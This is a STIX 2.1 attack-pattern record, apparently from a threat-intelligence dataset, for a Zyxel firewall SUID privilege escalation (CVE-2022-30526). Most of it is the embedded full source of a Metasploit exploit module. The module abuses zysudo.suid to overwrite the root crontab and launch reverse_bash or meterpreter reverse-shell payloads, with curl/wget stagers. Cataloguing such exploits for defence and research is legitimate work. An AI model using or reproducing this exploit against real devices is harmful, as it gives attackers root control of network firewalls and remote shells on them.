{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--306ad679-1b96-451d-939a-a32d87b7826f",
    "created": "2024-08-14T16:59:36.665947Z",
    "modified": "2024-08-14T16:59:36.665951Z",
    "name": "Zyxel Firewall SUID Binary Privilege Escalation",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/zyxel_suid_cp_lpe.rb",
            "external_id": "zyxel_suid_cp_lpe.rb"
        },
        {
            "source_name": "example",
            "external_id": "byexploitingCVE-2022-30525."
        },
        {
            "source_name": "CVE",
            "external_id": "2022-30526"
        },
        {
            "source_name": "reference",
            "url": "https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zyxel Firewall SUID Binary Privilege Escalation',\n        'Description' => %q{\n          This module exploits CVE-2022-30526, a local privilege escalation vulnerability that\n          allows a low privileged user (e.g. nobody) escalate to root. The issue stems from\n          a suid binary that allows all users to copy files as root. This module overwrites\n          the firewall's crontab to execute an attacker provided script, resulting in code\n          execution as root.\n\n          In order to use this module, the attacker must first establish shell access. For\n          example, by exploiting CVE-2022-30525.\n\n          Known affected Zyxel models are: USG FLEX (50, 50W, 100W, 200, 500, 700),\n          ATP (100, 200, 500, 700, 800), VPN (50, 100, 300, 1000), USG20-VPN and USG20W-VPN.\n        },\n        'References' => [\n          ['CVE', '2022-30526'],\n          ['URL', 'https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml']\n        ],\n        'Author' => [\n          'jbaines-r7' # discovery and metasploit module\n        ],\n        'DisclosureDate' => '2022-06-14',\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_CMD, ARCH_MIPS64],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_MIPS64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'wget' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mips64/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'MeterpreterTryToFork' => true,\n          'WfsDelay' => 70\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  # The check first establishes the system is a Zyxel firewall by parsing the\n  # /zyinit/fwversion file. Then it attempts to prove that zysudo.suid can be\n  # used by the user to write to otherwise unwrittable location.\n  def check\n    fwversion_data = read_file('/zyinit/fwversion')\n    if fwversion_data.nil? || fwversion_data.empty?\n      return CheckCode::Safe('Could not read /zyinit/fwversion. The target is not a Zyxel firewall.')\n    end\n\n    model_id = fwversion_data[/MODEL_ID=(?<model_id>[^\\n]+)/, :model_id]\n    return CheckCode::Unknown('Failed to identify the firewall model.') if model_id.nil? || model_id.empty?\n\n    firmware_ver = fwversion_data[/FIRMWARE_VER=(?<firmware_ver>[^\\n]+)/, :firmware_ver]\n    return CheckCode::Unknown('Failed to identify the firmware version.') if firmware_ver.nil? || firmware_ver.empty?\n\n    test_file = \"/var/zyxel/#{rand_text_alphanumeric(12..16)}\"\n    unless cmd_exec(\"/bin/cp /etc/passwd #{test_file}\") == \"/bin/cp: cannot create regular file '#{test_file}': Permission denied\"\n      return CheckCode::Unknown(\"Failed to generate a permission issue. System version: #{model_id}, #{firmware_ver}\")\n    end\n\n    suid_copy_result = cmd_exec(\"zysudo.suid /bin/cp /etc/passwd #{test_file}\")\n    unless suid_copy_result.empty?\n      return CheckCode::Safe(\"zysudo.suid copy failed. System version: #{model_id}, #{firmware_ver}\")\n    end\n\n    # clean up the created file\n    cmd_exec(\"zysudo.suid /bin/rm #{test_file}\")\n\n    return CheckCode::Vulnerable(\"System version: #{model_id}, #{firmware_ver}\")\n  end\n\n  # no matter what happens, try to reset the crontab to the original state and\n  # delete the backup file.\n  def cleanup\n    unless @crontab_backup.nil?\n      print_status('Resetting crontab to the original version')\n      cmd_exec(\"zysudo.suid /bin/cp #{@crontab_backup} /var/zyxel/crontab\")\n      rm_rf(@crontab_backup)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    # this file will contain the payload and get executed by cron\n    exec_filename = \"/tmp/#{rand_text_alphanumeric(6..12)}\"\n    register_file_for_cleanup(exec_filename)\n    cmd_exec(\"echo -e \\\"#!/bin/bash\\\\n\\\\n#{cmd}\\\" > #{exec_filename}\")\n    cmd_exec(\"chmod +x #{exec_filename}\")\n\n    # this file will be a copy of the original crontab, plus our additional malicious entry\n    evil_crontab = \"/tmp/#{rand_text_alphanumeric(6..12)}\"\n    register_file_for_cleanup(evil_crontab)\n    copy_file('/var/zyxel/crontab', evil_crontab)\n    cmd_exec(\"echo '* * * * * root #{exec_filename} &' >> #{evil_crontab}\")\n\n    # this is the backup copy of the original crontab. It'll be restored on new session\n    @crontab_backup = \"/tmp/#{rand_text_alphanumeric(6..12)}\"\n    copy_file('/var/zyxel/crontab', @crontab_backup)\n\n    # overwrite the legitimate crontab. this is how we get exectuion.\n    print_status('Overwriting /var/zyxel/crontab')\n    cmd_exec(\"zysudo.suid /bin/cp #{evil_crontab} /var/zyxel/crontab\")\n\n    # check if the session has been created. Give it 70 seconds to come in.\n    # The extra 10 seconds is to account for high latency links.\n    print_status('The payload may take up to 60 seconds to be executed by cron')\n    sleep_count = 70\n    until session_created? || sleep_count == 0\n      sleep(1)\n      sleep_count -= 1\n    end\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}